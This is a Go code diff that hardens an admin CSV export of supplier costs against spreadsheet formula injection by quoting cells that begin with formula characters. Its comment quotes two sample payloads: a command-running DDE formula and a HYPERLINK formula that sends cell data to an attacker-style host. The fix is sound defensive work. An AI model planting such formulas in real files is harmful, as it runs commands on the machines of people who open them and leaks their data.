@@ -111,13 +111,42 @@ func (h *AdminHandler) ExportSupplierCosts(c *gin.Context) {
 	_ = writer.Write([]string{"channel", "model", "input_cost", "output_cost", "status"})
 	for _, rec := range records {
 		_ = writer.Write([]string{
-			rec.Channel, rec.Model,
+			sanitizeCSVCell(rec.Channel), sanitizeCSVCell(rec.Model),
 			strconv.FormatFloat(storage.FromUnits(rec.InputCostUnitsPerMillion), 'f', 4, 64),
 			strconv.FormatFloat(storage.FromUnits(rec.OutputCostUnitsPerMillion), 'f', 4, 64),
-			rec.Status,
+			sanitizeCSVCell(rec.Status),
 		})
 	}
 	writer.Flush()
+}
+
+// sanitizeCSVCell neutralises spreadsheet formula injection in a CSV cell.
+//
+// The import path deliberately accepts operator/supplier-provided CSV files, and a
+// cell such as =cmd|' /C calc'!A0 or =HYPERLINK("http://atk/?"&A1,"x") is
+// executed by Excel/LibreOffice when the export is opened. encoding/csv only
+// quotes for commas and newlines, which does not help: the formula still starts
+// the cell. Prefixing a single quote keeps the value visible as text and matches
+// what the console's own export helper already does (web/src/config.js
+// csvEscape); the console downloads THIS endpoint's file, so the two had to agree
+// (BUG-CP-04).
+//
+// A leading space or tab is included because spreadsheet software trims it before
+// deciding whether the cell is a formula.
+func sanitizeCSVCell(value string) string {
+	if value == "" {
+		return value
+	}
+	trimmed := strings.TrimLeft(value, " \t")
+	if trimmed == "" {
+		// Whitespace-only cell: no formula can start here.
+		return value
+	}
+	switch trimmed[0] {
+	case '=', '+', '-', '@':
+		return "'" + value
+	}
+	return value
 }
 
 // ImportSupplierCosts accepts a CSV body (channel,model,input_cost,output_cost,
